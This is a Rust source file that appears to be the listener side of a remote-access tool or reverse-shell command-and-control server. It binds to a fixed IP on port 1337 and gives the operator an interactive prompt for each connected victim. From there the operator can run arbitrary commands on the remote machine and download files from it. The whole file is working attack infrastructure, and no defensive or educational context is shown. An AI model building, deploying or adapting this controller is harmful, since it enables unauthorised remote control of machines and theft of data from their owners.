use std::process::exit;

use colored::Colorize;

mod handler;
mod macros;

use handler::Handler;

fn main() {
    let ip = "198.19.249.3";
    let port = "1337";

    let listener = listener!(ip, port);

    println!("[*] Server binded to {}:{}", ip, port);
    for stream in listener.incoming() {
        let mut stream = match stream {
            Ok(stream) => stream,
            Err(e) => {
                println!("Error streaming tcp: {}", e);
                continue;
            }
        };
        std::thread::spawn(move || {
            println!("[*] New connection from {}", stream.peer_addr().unwrap());
            let mut handler = Handler::new(&mut stream);
            manager(&mut handler);
        });
    }
}

fn manager(handler: &mut Handler) {
    let mut should_stop = false;
    while !should_stop {
        let cmd = prompt!(handler);

        if cmd.starts_with("download") {
            let full_cmd = cmd.clone();
            println!("full_cmd: {}", full_cmd);
            let filename = full_cmd.split_whitespace().last().unwrap();
            let cmd = cmd.replace(filename, "");
            match handler.download(cmd, filename.to_string()) {
                Ok(_) => (),
                Err(e) => {
                    println!("Error downloading file: {}", e);
                }
            }
        } else if cmd.starts_with(".quit") {
            handler.quit().expect("Error quitting");
            should_stop = true;
        } else {
            match handler.exec(cmd) {
                Ok(_) => (),
                Err(e) => {
                    println!("Error executing command: {}", e);
                }
            }
        }
    }
    println!("[!!] Connection closed");
}
